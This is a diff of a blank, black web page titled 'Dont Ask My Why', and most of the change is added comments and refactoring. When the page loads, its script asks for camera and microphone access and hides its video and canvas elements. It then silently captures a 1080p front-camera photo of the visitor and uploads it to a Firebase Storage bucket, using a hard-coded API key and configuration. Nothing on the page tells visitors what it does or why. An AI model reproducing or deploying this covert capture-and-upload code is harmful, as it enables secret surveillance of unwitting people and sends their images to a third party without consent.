@@ -5,12 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dont Ask My Why</title>
     <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
+    
     <script type="module">
         // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
-        // Firebase configuration
+        // Firebase configuration object
         const firebaseConfig = {
             apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
             authDomain: "html-7fd9b.firebaseapp.com",
@@ -20,30 +21,36 @@
             appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
         };
 
-        // Initialize Firebase
+        // Initialize Firebase and set up storage
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // Function to upload image to Firebase
+        /**
+         * Function to upload image to Firebase Storage
+         * @param {string} imageData - The base64 encoded image data
+         */
         function uploadImage(imageData) {
-            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Set the path in Firebase Storage
             uploadString(storageRef, imageData, 'data_url')
                 .then(() => {
-                    console.log('Uploaded a blob or file!');
+                    console.log('Uploaded a blob or file successfully!');
                 })
                 .catch((error) => {
                     console.error('Error uploading image:', error);
                 });
         }
 
-        // Function to request permissions for microphone and camera
+        /**
+         * Function to request permissions for microphone and camera
+         * @returns {Promise<Object>} - Returns a promise that resolves with the microphone and camera streams
+         */
         async function requestPermissions() {
             try {
-                // Request microphone access
+                // Request microphone access first
                 const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 console.log('Microphone access granted.');
 
-                // Request camera access
+                // Request camera access after microphone
                 const camStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: { ideal: "user" }, // Use front camera
@@ -52,59 +59,87 @@
                     }
                 });
                 console.log('Camera access granted.');
-                return { micStream, camStream }; // Return both streams
+                return { micStream, camStream }; // Return both streams for further processing
             } catch (error) {
                 console.error('Error accessing microphone or camera: ', error);
-                throw error; // Rethrow the error for handling
+                throw error; // Propagate the error for handling in the main flow
             }
         }
 
-        // Access video and canvas elements
-        window.addEventListener('load', async () => {
-            const video = document.createElement('video');
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
+        /**
+         * Main function to set up video and canvas elements
+         */
+        async function setupCamera() {
+            const video = document.createElement('video'); // Create a video element for streaming
+            const canvas = document.createElement('canvas'); // Create a canvas element for image capture
+            const context = canvas.getContext('2d'); // Get the drawing context from the canvas
 
             try {
+                // Request permissions for microphone and camera
                 const { micStream, camStream } = await requestPermissions();
                 
-                // Set up video stream from camera
+                // Assign the camera stream to the video element
                 video.srcObject = camStream;
                 video.onloadedmetadata = () => {
-                    video.play();
-                    // Set canvas size for 1080p
-                    canvas.width = 1920;
-                    canvas.height = 1080;
-                    // Capture image immediately
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
-                    uploadImage(imageData); // Upload image to Firebase
-                    stopVideo(micStream); // Stop the microphone stream
-                    stopVideo(camStream); // Stop the camera stream
+                    video.play(); // Play the video stream when metadata is loaded
+                    // Set the canvas dimensions to match video resolution
+                    canvas.width = 1920; // Set canvas width
+                    canvas.height = 1080; // Set canvas height
+                    // Capture image from video stream
+                    captureImage(context, video, micStream, camStream);
                 };
             } catch (err) {
                 console.error('Permissions were not granted:', err);
             }
-        });
-
-        // Function to stop video stream
-        function stopVideo(stream) {
-            const tracks = stream.getTracks();
-            tracks.forEach(track => track.stop());
         }
+
+        /**
+         * Function to capture an image from the video stream
+         * @param {CanvasRenderingContext2D} context - The canvas context to draw on
+         * @param {HTMLVideoElement} video - The video element containing the stream
+         * @param {MediaStream} micStream - The microphone media stream
+         * @param {MediaStream} camStream - The camera media stream
+         */
+        function captureImage(context, video, micStream, camStream) {
+            // Draw the current frame from the video onto the canvas
+            context.drawImage(video, 0, 0, context.canvas.width, context.canvas.height);
+            const imageData = context.canvas.toDataURL('image/png'); // Convert canvas to image data URL
+            uploadImage(imageData); // Upload the captured image to Firebase
+            stopVideo(micStream); // Stop the microphone stream to conserve resources
+            stopVideo(camStream); // Stop the camera stream after capture
+        }
+
+        /**
+         * Function to stop any active media streams
+         * @param {MediaStream} stream - The media stream to stop
+         */
+        function stopVideo(stream) {
+            const tracks = stream.getTracks(); // Get all tracks from the stream
+            tracks.forEach(track => track.stop()); // Stop each track to release resources
+        }
+
+        // Event listener for window load to initialize camera setup
+        window.addEventListener('load', () => {
+            setupCamera(); // Start the camera setup process
+        });
     </script>
+
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #000; /* Black background */
+            background-color: #000; /* Set black background */
+            color: #fff; /* Optional: Text color for visibility */
+            font-family: Arial, sans-serif; /* Font styling */
         }
 
         video, canvas {
-            display: none; /* Hide video and canvas elements */
+            display: none; /* Hide video and canvas elements from display */
         }
     </style>
 </head>
 <body>
+    <!-- Optional: You can add content here if needed, or keep it empty -->
+    <h1 style="display: none;">This is a hidden heading</h1> <!-- Example of hidden content -->
 </body>
 </html>
